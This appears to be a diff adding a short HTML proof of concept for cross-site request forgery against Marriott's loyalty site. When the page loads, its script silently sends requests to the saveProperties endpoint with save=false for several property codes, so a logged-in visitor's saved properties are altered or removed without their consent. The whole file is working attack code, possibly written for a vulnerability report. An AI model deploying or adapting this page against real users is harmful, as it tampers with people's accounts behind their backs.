@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>REMOVING HOTEL BOOKING</title>
+</head>
+<body>
+    <p>REMOVING STAY CALM</p>
+    <div id="status"></div>
+
+    <script>
+        var propertyCodes = ['NYCES', 'NYCRI', 'NYCYC', 'NYCVC','NYCMD','NYCOX','NYCZW'];
+        function loadMarriottLink(code, index) {
+            setTimeout(function() {
+                var img = new Image();
+                img.onload = function() {
+                    document.getElementById('status').innerHTML += 'Property code ' + code + ' - Loaded successfully<br>';
+                };
+                img.onerror = function() {
+                    document.getElementById('status').innerHTML += 'Failed to load property code ' + code + '<br>';
+                };
+                img.src = 'https://www.marriott.com/loyalty/myAccount/saveProperties.mi?save=false&marshaCode='+code+'&returnTo=/default.mi';
+            }, 5000 * index);
+        }
+        window.onload = function() {
+            for (var i = 0; i < propertyCodes.length; i++) {
+                loadMarriottLink(propertyCodes[i], i);
+            }
+        };
+    </script>
+</body>
+</html>
